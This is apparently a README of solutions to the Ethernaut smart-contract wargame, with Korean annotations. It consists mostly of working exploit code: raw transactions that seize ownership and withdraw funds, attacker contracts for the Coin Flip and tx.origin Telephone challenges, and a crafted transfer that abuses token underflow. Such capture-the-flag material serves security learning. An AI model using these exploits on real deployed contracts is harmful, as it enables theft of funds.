# ethernaut-solve
https://ethernaut.openzeppelin.com/

### Hello Ethernaut
```
await contract.authenticate(await contract.address())
```

### Fallback
```
await sendTranscation({from:player, to:contract.address, value:1, data:"0xd7bb99ba"}) // call contribute
await sendTranscation({from:player, to:contract.address, value:1}) // fallback and take owner
await sendTranscation({from:player, to:contract.address, data:"0x3ccfd60b"}) // withdraw
```

### Fallout
낮은 버전 solidity에서 constructor 네이밍 실수
```
await sendTranscation({from:player, to:contract.address, data:"0x6fab5ddf"}) // call Fal1out
```

### Coin Flip
inner tx가 원하는 결과를 반환하지않으면 revert
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipCaller {
    address public coinFlipAddress = 0x72C860e67CEdfbc8B6Cc2BF9eAf6173be9A758BB;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function callFlip() public {
        bytes memory data = abi.encodeWithSignature("flip(bool)", true);

        (bool success, bytes memory result) = coinFlipAddress.call(data);
        
        if(!abi.decode(result, (bool)) || !success) revert();
    }
}
```

### Telephone
msg.sender = 현재 함수를 직접 호출한 address

tx.origin = 트랜잭션 최초로 호출한 address
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeTelephone {
    address public telephone = 0x209eDa374a2DF5ADA2BDd32797763325865935ce;
    address public newOwner = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;

    function changeOwner() public {
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", newOwner);

        (bool success, bytes memory result) = telephone.call(data);
        
        if(!success) revert();
    }
}
```

### Token
underflow를 활용한 토큰 탈취.
0.8부터는 해당 취약점은 개선됨.
```
const toAddress = '0xdead';
const toAddressPadded = '0'.repeat(24) + toAddress.slice(2).padStart(40, '0');

const value = 21;
const valuePadded = value.toString(16).padStart(64, '0');

const data = "0xa9059cbb" + toAddressPadded + valuePadded;
await sendTransaction({from:player, to:contract.address, data});
```
